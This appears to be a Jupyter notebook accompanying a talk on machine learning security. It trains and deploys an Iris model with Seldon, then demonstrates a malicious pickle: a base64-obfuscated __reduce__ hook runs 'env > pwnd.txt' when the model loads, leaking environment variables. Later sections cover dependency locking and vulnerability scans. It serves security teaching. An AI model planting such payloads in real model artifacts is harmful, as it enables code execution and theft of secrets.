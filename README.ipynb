{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9ad012ca",
   "metadata": {},
   "source": [
    "[![Maintenance](https://img.shields.io/badge/Maintained%3F-YES-green.svg)](https://github.com/EthicalML/awesome-production-machine-learning/graphs/commit-activity)\n",
    "![GitHub](https://img.shields.io/badge/Release-PROD-yellow.svg)\n",
    "![GitHub](https://img.shields.io/badge/Languages-MULTI-blue.svg)\n",
    "![GitHub](https://img.shields.io/badge/License-MIT-lightgrey.svg)\n",
    "[![GitHub](https://img.shields.io/twitter/follow/axsaucedo.svg?label=Follow)](https://twitter.com/AxSaucedo/)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e257722d",
   "metadata": {},
   "source": [
    "\n",
    "<table>\n",
    "<tr>\n",
    "<td width=\"70%\">\n",
    "<h1>Flawed Machine Learning Security</h1>\n",
    "</td>\n",
    "<td>\n",
    "<a href=\"https://youtu.be/dKjCWfuvYxQ?t=147\"><img src=\"images/bosstown.gif\"></a> <br> (AKA Exploring Secure ML)\n",
    "</td>\n",
    "</td>\n",
    "</table>\n",
    "\n",
    "\n",
    "## About this repo\n",
    "\n",
    "This Repo contains a set of resources relevant to the talk \"Secure Machine Learning at Scale with MLSecOps\", and provides a set of examples to showcase practical common security flaws throughout the multiple phases of the machine learning lifecycle."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "91669114",
   "metadata": {},
   "source": [
    "\n",
    "## Relevant Links\n",
    "\n",
    "### Link to Talk Resources\n",
    "\n",
    "Below are links to resources related to the talk, as well as references and relevant areas in machine learning security.\n",
    "\n",
    "| | | |\n",
    "|-|-|-|\n",
    "|[📄 Presentaiton Slides](https://docs.google.com/presentation/d/1Gu0We8RcMHksWc-7FCy_kYNfH8rq_c6qcAOsacSLAbE/edit#slide=id.g1041fb76f2f_0_177) |[🗣️ PyData Berlin Talk Link](https://2022.pycon.de/program/APTWQS/) | [📽️ Talk Video (Coming Soon)](#)|\n",
    "\n",
    "\n",
    "### Navigating the Repo Examples\n",
    "\n",
    "Below is the direct links to each of the headers that map to the main key sections of the presentation slides.\n",
    "\n",
    "* [Train Model and Deploy Artifact](#1---train-model-and-deploy-artifact)\n",
    "* [Load Pickle and Inject Malicious Code](#2---load-pickle-and-inject-malicious-code)\n",
    "* [Adversarial Detection](#3---adversarial-detection)\n",
    "* [Dependency Vulnerability Scans](#4---dependency-vulnerability-scans)\n",
    "* [Code Scans](#5---code-scans)\n",
    "* [Container Scans](#6---container-scan)\n",
    "\n",
    "\n",
    "### Links to Other Talks and Relevant Resources\n",
    "\n",
    "| | | |\n",
    "|-|-|-|\n",
    "|[📜 Machine Learning Ecosystem List](https://github.com/EthicalML/awesome-production-machine-learning/)|[📚 The State of ML Operations](https://www.youtube.com/watch?v=Ynb6X0KZKxY)|[📈 Prod ML Monitoring](https://www.youtube.com/watch?v=QcevzK9ZuDg&t=3s)|||\n",
    "|[🌀 Accelerating ML Inference at Scale](https://www.youtube.com/watch?v=T0pPn5KTxFE&t=4s)|[🕵️‍♀️ Alibi Detect Adversarial Detection](https://docs.seldon.io/projects/alibi-detect/en/latest/examples/alibi_detect_deploy.html)|[👓 Practical AI Ethics](https://www.youtube.com/watch?v=57YpXjcj0Ho&t=63s)|||\n",
    "\n",
    "## Other relevant resources\n",
    "\n",
    "<table>\n",
    "  <tr>\n",
    "    <td width=\"30%\">\n",
    "         You can join the <a href=\"https://ethical.institute/mle.html\">Machine Learning Engineer</a> newsletter. You will receive updates on open source frameworks, tutorials and articles curated by machine learning professionals.\n",
    "    </td>\n",
    "    <td width=\"70%\">\n",
    "        <a href=\"https://ethical.institute/mle.html\"><img src=\"images/mleng.png\"></a>\n",
    "    </td>\n",
    "  </tr>\n",
    "</table>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "52a22e81",
   "metadata": {},
   "source": [
    "## Requirements\n",
    "\n",
    "The notebook was created with the following requirements:\n",
    "\n",
    "* kubectl - v1.22.5\n",
    "* istioctl v1.11.4\n",
    "* helm - v.3.7.0\n",
    "* mc (minio client) - RELEASE.2020-04-17T08-55-48Z\n",
    "* Kubernetes > 1.18\n",
    "* Python 3.7\n",
    "\n",
    "## Setting up environment\n",
    "\n",
    "In order to set up the environment correctly, you will have to follow the [SETUP.ipynb](SETUP.ipynb) Jupyter notebook."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e8036a6d",
   "metadata": {},
   "source": [
    "## 1 - Train Model and Deploy Artifact\n",
    "\n",
    "![](images/ml-deploy.jpg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eb4ece9a",
   "metadata": {},
   "source": [
    "#### Install requirements for model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "4a87a893",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing requirements.txt\n"
     ]
    }
   ],
   "source": [
    "%%writefile requirements.txt\n",
    "seldon_core\n",
    "scikit-learn == 0.24.2\n",
    "numpy >= 1.8.2\n",
    "joblib == 0.16.0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "735afb7a",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install -r requirements.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "05ae5759",
   "metadata": {},
   "source": [
    "#### Import datasets to train Iris model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "0195bb8c",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn import datasets\n",
    "\n",
    "iris = datasets.load_iris()\n",
    "X, y = iris.data, iris.target"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b1bf7dcc",
   "metadata": {},
   "source": [
    "#### Import simple LogsticRegression model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "91087153",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.linear_model import LogisticRegression\n",
    "\n",
    "model = LogisticRegression(solver=\"liblinear\", multi_class='ovr')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c400bd1f",
   "metadata": {},
   "source": [
    "#### Train model with dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "1cd4cdd3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "LogisticRegression(multi_class='ovr', solver='liblinear')"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model.fit(X, y)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d6395a07",
   "metadata": {},
   "source": [
    "#### Run prediction to test model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "0f3135ee",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([0])"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model.predict(X[:1])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bdf5ef1d",
   "metadata": {},
   "source": [
    "#### Dump model binary with pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "d0a98be9",
   "metadata": {},
   "outputs": [],
   "source": [
    "!mkdir -p fml-artifacts/safe/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "219b79eb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['fml-artifacts/safe/model.joblib']"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import joblib\n",
    "\n",
    "joblib.dump(model, \"fml-artifacts/safe/model.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "b67dcf6a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[b'\\x80\\x03csklearn.linear_model._logistic\\n', b'LogisticRegression\\n', b'q\\x00)\\x81q\\x01}q\\x02(X\\x07\\x00\\x00\\x00penaltyq\\x03X\\x02\\x00\\x00\\x00l2q\\x04X\\x04\\x00\\x00\\x00dualq\\x05\\x89X\\x03\\x00\\x00\\x00tolq\\x06G?\\x1a6\\xe2\\xeb\\x1cC-X\\x01\\x00\\x00\\x00Cq\\x07G?\\xf0\\x00\\x00\\x00\\x00\\x00\\x00X\\r\\x00\\x00\\x00fit_interceptq\\x08\\x88X\\x11\\x00\\x00\\x00intercept_scalingq\\tK\\x01X\\x0c\\x00\\x00\\x00class_weightq\\n', b'NX\\x0c\\x00\\x00\\x00random_stateq\\x0bNX\\x06\\x00\\x00\\x00solverq\\x0cX\\t\\x00\\x00\\x00liblinearq\\rX\\x08\\x00\\x00\\x00max_iterq\\x0eKdX\\x0b\\x00\\x00\\x00multi_classq\\x0fX\\x03\\x00\\x00\\x00ovrq\\x10X\\x07\\x00\\x00\\x00verboseq\\x11K\\x00X\\n', b'\\x00\\x00\\x00warm_startq\\x12\\x89X\\x06\\x00\\x00\\x00n_jobsq\\x13NX\\x08\\x00\\x00\\x00l1_ratioq\\x14NX\\x0e\\x00\\x00\\x00n_features_in_q\\x15K\\x04X\\x08\\x00\\x00\\x00classes_q\\x16cjoblib.numpy_pickle\\n', b'NumpyArrayWrapper\\n', b'q\\x17)\\x81q\\x18}q\\x19(X\\x08\\x00\\x00\\x00subclassq\\x1acnumpy\\n', b'ndarray\\n', b'q\\x1bX\\x05\\x00\\x00\\x00shapeq\\x1cK\\x03\\x85q\\x1dX\\x05\\x00\\x00\\x00orderq\\x1eh\\x07X\\x05\\x00\\x00\\x00dtypeq\\x1fcnumpy\\n', b'dtype\\n', b'q X\\x02\\x00\\x00\\x00i8q!\\x89\\x88\\x87q\"Rq#(K\\x03X\\x01\\x00\\x00\\x00<q$NNNJ\\xff\\xff\\xff\\xffJ\\xff\\xff\\xff\\xffK\\x00tq%bX\\n', b'\\x00\\x00\\x00allow_mmapq&\\x88ub\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00X\\x05\\x00\\x00\\x00coef_q\\'h\\x17)\\x81q(}q)(h\\x1ah\\x1bh\\x1cK\\x03K\\x04\\x86q*h\\x1eX\\x01\\x00\\x00\\x00Fq+h\\x1fh X\\x02\\x00\\x00\\x00f8q,\\x89\\x88\\x87q-Rq.(K\\x03h$NNNJ\\xff\\xff\\xff\\xffJ\\xff\\xff\\xff\\xffK\\x00tq/bh&\\x88ub, ?T\\xff@\\xda?\\xf6_5nM\\\\\\xdb?.z\\xa2\\x86\\xfbQ\\xfb\\xbf\\x0bh|N5m\\xf7?w\\xfa$3:\\xcb\\xf9\\xbf\\xbc\\x99m\\xbff\\x8c\\xf8\\xbf{\\xc8\\x01\\x01\\x8c\\x14\\x02\\xc0l\\xcb\\xc4e\\x18m\\xe2?\\xb3s\\x82\\xa2\\x8a\\xc4\\x03@`\\xf08\\xe4(V\\xf0\\xbf\"\\\\}\\x85\\xaf\\x7f\\xf6\\xbf\\x03M#\\n', b'fq\\x04@X\\n', b\"\\x00\\x00\\x00intercept_q0h\\x17)\\x81q1}q2(h\\x1ah\\x1bh\\x1cK\\x03\\x85q3h\\x1eh\\x07h\\x1fh.h&\\x88ub\\xb5~?\\xd6\\xf4\\xe8\\xd0?\\x8d\\xd5\\xfc'\\xb7\\x80\\xf1??\\xc3\\xdc\\xe0ro\\xf3\\xbfX\\x07\\x00\\x00\\x00n_iter_q4h\\x17)\\x81q5}q6(h\\x1ah\\x1bh\\x1cK\\x01\\x85q7h\\x1eh\\x07h\\x1fh X\\x02\\x00\\x00\\x00i4q8\\x89\\x88\\x87q9Rq:(K\\x03h$NNNJ\\xff\\xff\\xff\\xffJ\\xff\\xff\\xff\\xffK\\x00tq;bh&\\x88ub\\x07\\x00\\x00\\x00X\\x10\\x00\\x00\\x00_sklearn_versionq<X\\x06\\x00\\x00\\x000.24.2q=ub.\"]\n"
     ]
    }
   ],
   "source": [
    "with open(\"fml-artifacts/safe/model.joblib\", \"rb\") as f: print(f.readlines())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "39832b06",
   "metadata": {},
   "source": [
    "#### Deploy the model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "6e317e2c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[m\u001b[32;1m\r",
      " 0 B / ? ┃░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓┃\u001b[0m\u001b[0m\u001b[m\u001b[32;1m\r",
      "...el.joblib:  1.05 KiB / 1.05 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 63.43 KiB/s 0s\u001b[0m\u001b[0m"
     ]
    }
   ],
   "source": [
    "!mc cp -r fml-artifacts/ minio-seldon/fml-artifacts/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "99642eeb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "seldondeployment.machinelearning.seldon.io/model-safe unchanged\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "kubectl apply -f - << END\n",
    "apiVersion: machinelearning.seldon.io/v1\n",
    "kind: SeldonDeployment\n",
    "metadata:\n",
    "  name: model-safe\n",
    "spec:\n",
    "  predictors:\n",
    "  - graph:\n",
    "      implementation: SKLEARN_SERVER\n",
    "      modelUri: s3://fml-artifacts/safe\n",
    "      envSecretRefName: seldon-init-container-secret\n",
    "      name: classifier\n",
    "    name: default\n",
    "END"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "df6bc8ad",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "model-safe-default-0-classifier-68f495d845-xwrkm     2/2     Running   0          11h\r\n"
     ]
    }
   ],
   "source": [
    "!kubectl get pods | grep model-safe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "be678a90",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'data': {'names': ['t:0', 't:1', 't:2'],\n",
       "  'ndarray': [[0.0006985194531162835,\n",
       "    0.00366803903943666,\n",
       "    0.995633441507447]]},\n",
       " 'meta': {'requestPath': {'classifier': 'seldonio/sklearnserver:1.13.1'}}}"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "url = \"http://localhost:80/seldon/default/model-safe/api/v1.0/predictions\"\n",
    "\n",
    "requests.post(url, json={\"data\": {\"ndarray\": [[1,2,3,4]]}}).json()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "10e20f6d",
   "metadata": {},
   "source": [
    "## 2 - Load Pickle and Inject Malicious Code\n",
    "\n",
    "![](images/ml-artifacts.jpg)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "afad4ed8",
   "metadata": {},
   "outputs": [],
   "source": [
    "import joblib\n",
    "\n",
    "model_safe = joblib.load(\"fml-artifacts/safe/model.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "b62f52d5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([0])"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model_safe.predict(X[:1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "9ea5bab0",
   "metadata": {},
   "outputs": [],
   "source": [
    "import types, os, base64\n",
    "\n",
    "def __reduce__(self):\n",
    "    # This is basically base64 for cmd = \"env > pwnd.txt\"\n",
    "    cmd = base64.b64decode(\"ZW52ID4gcHduZC50eHQ=\").decode() \n",
    "    return os.system, (cmd,)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "16e644fd",
   "metadata": {},
   "outputs": [],
   "source": [
    "model_safe.__class__.__reduce__ = types.MethodType(__reduce__, model_safe.__class__)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "c7313919",
   "metadata": {},
   "outputs": [],
   "source": [
    "!mkdir -p fml-artifacts/unsafe/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "7d7d9dc5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['fml-artifacts/unsafe/model.joblib']"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "joblib.dump(model_safe, \"fml-artifacts/unsafe/model.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "9deaba78",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[b'\\x80\\x03cposix\\n', b'system\\n', b'q\\x00X\\x0e\\x00\\x00\\x00env > pwnd.txtq\\x01\\x85q\\x02Rq\\x03.']\n"
     ]
    }
   ],
   "source": [
    "with open(\"fml-artifacts/unsafe/model.joblib\", \"rb\") as f: print(f.readlines())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9d56a665",
   "metadata": {},
   "source": [
    "#### Deploy the model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "a0aa434e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[m\u001b[32;1m\r",
      " 0 B / ? ┃░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓┃\u001b[0m\u001b[0m\u001b[m\u001b[32;1m\r",
      "...el.joblib:  1.05 KiB / 1.05 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 103.36 KiB/s 0s\u001b[0m\u001b[0m"
     ]
    }
   ],
   "source": [
    "!mc cp -r fml-artifacts/ minio-seldon/fml-artifacts/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "67b2a805",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "seldondeployment.machinelearning.seldon.io/model-unsafe unchanged\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "kubectl apply -f - << END\n",
    "apiVersion: machinelearning.seldon.io/v1\n",
    "kind: SeldonDeployment\n",
    "metadata:\n",
    "  name: model-unsafe\n",
    "spec:\n",
    "  predictors:\n",
    "  - graph:\n",
    "      implementation: SKLEARN_SERVER\n",
    "      modelUri: s3://fml-artifacts/unsafe\n",
    "      envSecretRefName: seldon-init-container-secret\n",
    "      name: classifier\n",
    "    name: default\n",
    "END"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "19b8ae10",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                                                 READY   STATUS    RESTARTS   AGE\r\n",
      "model-safe-default-0-classifier-68f495d845-xwrkm     2/2     Running   0          11h\r\n",
      "model-unsafe-default-0-classifier-85969ff86c-rtwt5   2/2     Running   0          11h\r\n"
     ]
    }
   ],
   "source": [
    "!kubectl get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "e6892860",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SERVICE_TYPE=MODEL\n",
      "LC_ALL=C.UTF-8\n",
      "MODEL_UNSAFE_DEFAULT_SERVICE_PORT_GRPC=5001\n",
      "MODEL_SAFE_DEFAULT_PORT_5001_TCP_PROTO=tcp\n",
      "MODEL_UNSAFE_DEFAULT_SERVICE_PORT_HTTP=8000\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "UNSAFE_POD=$(kubectl get pod -l app=model-unsafe-default-0-classifier -o jsonpath=\"{.items[0].metadata.name}\")\n",
    "kubectl exec $UNSAFE_POD -c classifier -- head -5 pwnd.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eaa09132",
   "metadata": {},
   "source": [
    "#### Now reload the insecure pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "d1d749a0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ls: cannot access 'pwnd.txt': No such file or directory\r\n"
     ]
    }
   ],
   "source": [
    "!ls pwnd.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "18989e88",
   "metadata": {},
   "outputs": [],
   "source": [
    "import joblib\n",
    "\n",
    "model_unsafe = joblib.load(\"fml-artifacts/unsafe/model.joblib\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "380b1216",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CONDA_PROMPT_MODIFIER=(base) \r\n",
      "TMUX=/tmp/tmux-1000/default,98,0\r\n",
      "PYSPARK_DRIVER_PYTHON=jupyter\r\n",
      "USER=alejandro\r\n"
     ]
    }
   ],
   "source": [
    "!head -4 pwnd.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2717fe95",
   "metadata": {},
   "source": [
    "#### Cleaning Artifacts Section"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "97b50d08",
   "metadata": {},
   "outputs": [],
   "source": [
    "!rm pwnd.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "13de0100",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "seldondeployment.machinelearning.seldon.io \"model-safe\" deleted\r\n",
      "seldondeployment.machinelearning.seldon.io \"model-unsafe\" deleted\r\n"
     ]
    }
   ],
   "source": [
    "!kubectl delete sdep model-safe model-unsafe "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "94219270",
   "metadata": {},
   "source": [
    "## 3 - Adversarial Detection"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "85f417d9",
   "metadata": {},
   "source": [
    "Using Alibi Detect end to end adversarial detection example https://docs.seldon.io/projects/alibi-detect/en/latest/examples/alibi_detect_deploy.html"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a231aab3",
   "metadata": {},
   "source": [
    "## Model Server"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "afdc0d5f",
   "metadata": {},
   "source": [
    "#### Revisiting our requirements"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "b8ffd0f8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "seldon_core\r\n",
      "scikit-learn == 0.24.2\r\n",
      "numpy >= 1.8.2\r\n",
      "joblib == 0.16.0\r\n"
     ]
    }
   ],
   "source": [
    "!cat requirements.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0ba0fe84",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install pipdeptree"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "85a7b141",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pipdeptree"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0c05f66b",
   "metadata": {},
   "source": [
    "#### Identifying shortcomings of pip\n",
    "\n",
    "If we visualise the output of sklearn itself, we can see that for the dependencies we have a set of ranges as follows:\n",
    "\n",
    "```\n",
    "scikit-learn==0.24.2\n",
    "  - joblib [required: >=0.11, installed: 0.16.0]\n",
    "  - numpy [required: >=1.13.3, installed: 1.21.5]\n",
    "  - scipy [required: >=0.19.1, installed: 1.7.3]\n",
    "    - numpy [required: >=1.16.5,<1.23.0, installed: 1.21.5]\n",
    "  - threadpoolctl [required: >=2.0.0, installed: 3.1.0]\n",
    "```\n",
    "\n",
    "This means that if we run an install, we may have 2nd+ level dependencies that may change causing undesired effects."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "36248377",
   "metadata": {},
   "source": [
    "#### Workaround with PIP\n",
    "\n",
    "We can actually create our makeshift environment freeze by using PIP directly."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "a3ea47a4",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip freeze > requirements-freeze.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "9820a84b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "attrs==21.4.0\r\n",
      "bcrypt==3.1.7\r\n",
      "certifi==2021.10.8\r\n",
      "cffi==1.15.0\r\n",
      "charset-normalizer==2.0.12\r\n",
      "click==8.0.4\r\n",
      "cryptography==3.4.8\r\n",
      "docker-compose==1.25.0\r\n",
      "dockerpty==0.4.1\r\n",
      "docopt==0.6.2\r\n"
     ]
    }
   ],
   "source": [
    "!head -10 requirements-freeze.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7a118bbb",
   "metadata": {},
   "source": [
    "#### Solving with Poetry\n",
    "\n",
    "A better solution is to use poetry to lock the dependencies required into a .lock file that saves a fully reproducible environment."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "a86eb803",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting pyproject.toml\n"
     ]
    }
   ],
   "source": [
    "%%writefile pyproject.toml\n",
    "[tool.poetry]\n",
    "name = \"fml-security\"\n",
    "version = \"0.1.0\"\n",
    "description = \"\"\n",
    "authors = [\"Alejandro Saucedo <axsauze@gmail.com>\"]\n",
    "\n",
    "[tool.poetry.dependencies]\n",
    "python = \">=3.7,<3.11\"\n",
    "\n",
    "seldon-core = \"1.13.1\"\n",
    "scikit-learn = \"0.24.2\"\n",
    "numpy = \"1.21.5\"\n",
    "joblib = \"0.16.0\"\n",
    "\n",
    "[tool.poetry.dev-dependencies]\n",
    "pytest = \"^5.2\"\n",
    "\n",
    "[build-system]\n",
    "requires = [\"poetry-core>=1.0.0\"]\n",
    "build-backend = \"poetry.core.masonry.api\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "358f38ea",
   "metadata": {},
   "outputs": [],
   "source": [
    "!poetry install"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "51657945",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[[package]]\r\n",
      "name = \"atomicwrites\"\r\n",
      "version = \"1.4.0\"\r\n",
      "description = \"Atomic file writes.\"\r\n",
      "category = \"dev\"\r\n",
      "optional = false\r\n",
      "python-versions = \">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*\"\r\n",
      "\r\n",
      "[[package]]\r\n",
      "name = \"attrs\"\r\n",
      "version = \"21.4.0\"\r\n",
      "description = \"Classes Without Boilerplate\"\r\n",
      "category = \"main\"\r\n",
      "optional = false\r\n",
      "python-versions = \">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*\"\r\n",
      "\r\n",
      "[package.extras]\r\n",
      "dev = [\"coverage[toml] (>=5.0.2)\", \"hypothesis\", \"pympler\", \"pytest (>=4.3.0)\", \"six\", \"mypy\", \"pytest-mypy-plugins\", \"zope.interface\", \"furo\", \"sphinx\", \"sphinx-notfound-page\", \"pre-commit\", \"cloudpickle\"]\r\n",
      "docs = [\"furo\", \"sphinx\", \"zope.interface\", \"sphinx-notfound-page\"]\r\n",
      "tests = [\"coverage[toml] (>=5.0.2)\", \"hypothesis\", \"pympler\", \"pytest (>=4.3.0)\", \"six\", \"mypy\", \"pytest-mypy-plugins\", \"zope.interface\", \"cloudpickle\"]\r\n"
     ]
    }
   ],
   "source": [
    "!head -20 poetry.lock"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "180c8dd2",
   "metadata": {},
   "source": [
    "## 4 - Dependency Vulnerability Scans"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fa12f371",
   "metadata": {},
   "source": [
    "#### Scanning Python Versions against CVE Database"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "479382e8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: safety in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (1.10.3)\n",
      "Requirement already satisfied: requests in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from safety) (2.27.1)\n",
      "Requirement already satisfied: Click>=6.0 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from safety) (8.0.4)\n",
      "Requirement already satisfied: packaging in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from safety) (21.3)\n",
      "Requirement already satisfied: setuptools in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from safety) (62.0.0)\n",
      "Requirement already satisfied: dparse>=0.5.1 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from safety) (0.5.1)\n",
      "Requirement already satisfied: importlib-metadata in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from Click>=6.0->safety) (4.11.3)\n",
      "Requirement already satisfied: toml in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from dparse>=0.5.1->safety) (0.10.2)\n",
      "Requirement already satisfied: pyyaml in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from dparse>=0.5.1->safety) (5.4.1)\n",
